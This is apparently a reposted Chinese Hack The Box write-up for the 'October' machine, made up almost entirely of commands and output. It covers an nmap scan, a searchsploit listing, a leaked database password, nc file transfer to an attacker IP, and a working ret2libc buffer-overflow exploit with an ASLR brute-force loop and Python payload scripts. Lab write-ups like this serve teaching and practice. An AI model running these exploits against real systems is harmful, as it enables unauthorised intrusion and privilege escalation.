# [HTB] October Writeup

> 原文: https://www.ctfiot.com/50413.html
> ID: 50413


```
时间: 2021-09-08
机器作者: ch4p
困难程度: easy
MACHINE TAGS:
* PHP
* External
* Apache
* Penetration Tester Level 3
* Unrestricted File Upload
* Binary Exploitation
* Buffer Overflow
* Default Credentials
# nmap -p- -n -Pn -sC --min-rate 2000 -oA nmap/portscan -v 10.10.10.16
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey:
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
80/tcp open  http
|_http-favicon: Unknown favicon MD5: 1D585CCF71E2EB73F03BCF484CFC2259
| http-methods:
|   Supported Methods: GET HEAD POST PUT PATCH DELETE OPTIONS
|_  Potentially risky methods: PUT PATCH DELETE
|_http-title: October CMS - Vanilla
$ searchsploit October
--------------------------------------------------------------------
October CMS - Upload Protection Bypass Code Execution (Metasploit) | php/remote/47376.rb
October CMS 1.0.412 - Multiple Vulnerabilities | php/webapps/41936.txt
October CMS < 1.0.431 - Cross-Site Scripting | php/webapps/44144.txt
October CMS Build 465 - Arbitrary File Read Exploit (Authenticated) | php/webapps/49045.sh
October CMS User Plugin 1.4.5 - Persistent Cross-Site Scripting | php/webapps/44546.txt
OctoberCMS 1.0.425 (Build 425) - Cross-Site Scripting | php/webapps/42978.txt
OctoberCMS 1.0.426 (Build 426) - Cross-Site Request Forgery | php/webapps/43106.txt
https://bitflipper.eu/finding/2017/04/october-cms-v10412-several-issues.html
'mysql' => [
    'driver'    => 'mysql',
    'host'      => 'localhost',
    'port'      => '',
    'database'  => 'october',
    'username'  => 'october',
    'password'  => 'OctoberCMSPassword!!',
    'charset'   => 'utf8',
    'collation' => 'utf8_unicode_ci',
    'prefix'    => '',
],
$ nc -l -p 9901 > ovrflw # kali监听接收
$ nc -w 5 10.10.17.64 9901 < /usr/local/bin/ovrflw
gef➤  checksec
[+] checksec for '/home/kali/hackthebox/October/file/pwn/ovrflw'
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0

$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/"
 162bac /bin/sh
 164b10 /bin/csh
$ cat /proc/sys/kernel/randomize_va_space
2
'A' * 112 + system_plt + 0x0000000 + bin_sh_addr
$ objdump -d -j .plt /usr/local/bin/ovrflw
system: 0xb75f8000+0x40310 = 0xB7638310
exit: 0xb75f8000+0x33260 = 0xB762B260
/bin/sh: = 0xb75f8000+0x162bac = 0xB775ABAC
$ while true; do /usr/local/bin/ovrflw $(python -c 'print "x90"*112 + "x10x83x63xb7" + "x60xb2x62xb7" + "xacxabx75xb7"'); done
import struct

system_addr = struct.pack("<I", 0xffffffff)
exit_addr = struct.pack("<I", 0xffffffff)
arg_addr = struct.pack("<I", 0xffffffff)

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

print buf
from subprocess import call
import struct

lib_base_addr = 0xffffffff
system_off = 0xffffffff
exit_off = 0xffffffff
arg_off = 0xffffffff

system_addr = struct.pack("<I", lib_base_addr + system_off)
exit_addr = struct.pack("<I", lib_base_addr + exit_off)
arg_addr = struct.pack("<I", lib_base_addr + arg_off)

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

call(["/usr/local/bin/ovrflw", buf])
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/07/5-1658983434.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/07/2-1658983435.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/07/8-1658983436.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/07/3-1658983436.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/07/4-1658983437.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/07/10-1658983437.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/07/9-1658983437.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/07/8-1658983438.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/07/9-1658983438.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/07/5-1658983439.png)